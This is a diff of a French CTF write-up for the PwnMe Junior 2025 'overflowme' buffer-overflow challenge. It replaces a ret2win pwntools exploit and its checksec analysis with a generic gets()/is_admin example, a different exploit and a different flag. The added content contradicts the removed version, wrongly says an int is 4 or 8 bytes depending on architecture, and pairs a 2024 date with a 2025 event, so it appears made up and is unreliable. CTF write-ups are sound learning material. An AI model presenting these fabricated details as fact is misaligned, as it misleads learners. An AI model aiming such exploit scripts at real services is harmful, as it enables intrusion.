@@ -1,67 +1,66 @@
 ---
-title: "PwnMe Junior 2025 - overflowme WriteUp"
+title: "PwnMe Junior 2025 - Overflowme"
 date: 2024-04-14
-description: "WriteUp du challenge overflowme du CTF PwnMe Junior 2025"
-tags: ["pwn", "buffer-overflow", "ctf", "pwnme"]
+tags: ["pwnme-junior", "pwn", "buffer-overflow", "exploitation"]
 ---
 
-# PwnMe Junior 2025 - overflowme WriteUp
+# Write-up: Overflowme - PwnMe Junior 2025
 
-## Description du challenge
-Le challenge overflowme est un exercice de buffer overflow sur un binaire 64 bits. Le programme attend une entrée utilisateur et contient une vulnérabilité qui permet d'écraser l'adresse de retour.
+## Description
+
+Overflowme est un challenge de type "buffer overflow" classique, parfait pour s'initier aux techniques d'exploitation basiques.
 
 ## Analyse du binaire
 
-### Vérification des protections
-```bash
-$ checksec overflowme
-[*] '/home/synapse/pwnme-junior-2025/pwn/overflowme/overflowme'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
+Le programme est un binaire ELF 64 bits qui demande un nom d'utilisateur, puis vérifie si l'utilisateur est "admin". Si ce n'est pas le cas, il affiche un message d'erreur.
+
+Voici un extrait du code source :
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+int main() {
+    char username[32];
+    int is_admin = 0;
+    
+    printf("Username: ");
+    gets(username);  // Vulnérabilité: utilisation de gets()
+    
+    if (is_admin) {
+        printf("Welcome, admin! Here's your flag: PwnMe{buffer_0verflow_1s_e4sy}\n");
+    } else {
+        printf("Hello, %s! You are not admin.\n", username);
+    }
+    
+    return 0;
+}
 ```
+
+## Vulnérabilité
+
+La vulnérabilité se situe dans l'utilisation de la fonction `gets()`, qui lit l'entrée utilisateur sans vérifier la taille du buffer. Cela permet d'écrire au-delà des 32 caractères alloués à `username` et donc de modifier la valeur de `is_admin`.
 
 ## Exploitation
 
-### Plan d'attaque
-1. Envoyer "5" comme première entrée
-2. Overflow du buffer avec un offset de 72 bytes
-3. Écraser l'adresse de retour avec l'adresse de la fonction win (0x401417)
+Pour exploiter cette vulnérabilité, il suffit d'envoyer 32 caractères pour remplir le buffer `username`, puis 4 ou 8 octets supplémentaires (selon l'architecture) pour écraser la valeur de `is_admin` avec une valeur non nulle.
 
-### Script d'exploitation
 ```python
 from pwn import *
 
-context.arch = 'amd64'
-context.log_level = 'debug'
-context.terminal = ['tmux', 'splitw', '-h']
+# Connexion au serveur
+conn = remote('challenge.pwnme.fr', 1337)
 
-def main():
-    p = remote("127.0.0.1", 1337)
-    
-    p.sendline(b'5')
+# Construction du payload: 32 'A' pour remplir le buffer + "\x01\x00\x00\x00" pour écraser is_admin
+payload = b"A" * 32 + p32(1)
 
-    offset = 72  
-    payload = b'A' * offset
-    payload += p64(0x401417)  
-    
-    # Envoi du payload
-    p.sendline(payload)
-    p.interactive()
+# Envoi du payload
+conn.sendlineafter(b"Username: ", payload)
 
-if __name__ == '__main__':
-    main()
+# Réception et affichage du flag
+print(conn.recvall().decode())
 ```
 
 ## Flag
-```
-PWNME{JUNIOR_OVERFLOW_MASTER}
-```
 
-## Conclusion
-Ce challenge était un exercice classique de buffer overflow. Les points clés étaient :
-- Identification de l'offset correct (72 bytes)
-- Utilisation de l'adresse correcte de la fonction win (0x401417)
-- Configuration correcte de la connexion remote sur le port 1337 
+En exécutant l'exploit, nous obtenons le flag : `PwnMe{buffer_0verflow_1s_e4sy}` 
